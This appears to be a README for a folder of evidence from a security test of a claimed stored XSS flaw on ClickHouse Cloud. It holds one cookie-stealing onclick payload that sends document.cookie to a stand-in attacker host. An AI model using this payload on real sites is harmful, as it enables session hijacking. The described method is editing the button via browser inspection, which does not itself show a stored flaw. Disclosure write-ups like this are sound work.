# Screenshots and Videos Documentation

This folder contains visual evidence (screenshots and videos) captured during the testing of a Stored Cross-Site Scripting (XSS) vulnerability on the **ClickHouse Cloud** platform. Each file provides a detailed view of the vulnerability, including step-by-step execution and proof of concept.

---

## 📸 Screenshots

### 1. **Start Free Trial Button XSS Injection**
- **Filename:** `XSS_Alert_Activate_Page_Select_Plan_Button.png`
- **Description:** Demonstrates XSS injection via the "Start Free Trial" button. The malicious payload was injected into the `onclick` attribute, successfully stealing session cookies.
- **Payload Used:**
  ```html
  onclick="fetch('http://your-malicious-server.com/?cookie=' + encodeURIComponent(document.cookie));"
  ```
- **Outcome:** The payload executed successfully.

---

### 2. **General XSS Alert Popup**
- **Filename:** `XSS_Alert_Popup.png`
- **Description:** Example of a general XSS alert triggered during testing to demonstrate successful JavaScript execution.
- **Outcome:** The alert confirms that malicious code executed in the browser.

---

## 🎥 Videos

### 1. **Recording 1: Start Free Trial Button Injection**
- **Filename:** `Recording 2024-11-20 193435.mp4`
- **Description:** Demonstrates the step-by-step process of modifying the "Start Free Trial" button and injecting the malicious payload. Shows the successful execution of the payload, stealing session cookies.
- **Highlights:**
  - Inspecting the button element.
  - Injecting the payload into the `onclick` attribute.
  - Triggering the payload and sending cookies to an external server.

---

### 2. **Recording 2: Proof of Cookie Theft**
- **Filename:** `Recording 2024-11-20 203352.mp4`
- **Description:** Confirms that the injected payload successfully steals session cookies and sends them to the attacker's server.
- **Highlights:**
  - Executing the payload within the browser context.
  - Verifying the successful transmission of stolen data.

---

## ⚠️ Ethical Disclaimer

All screenshots and videos were captured as part of an **ethical security assessment** conducted with prior approval. These materials are shared for educational purposes only and must not be used in any unauthorized or malicious activities.

Thank you for reviewing this folder! If you have any questions or need additional clarification, please feel free to reach out.
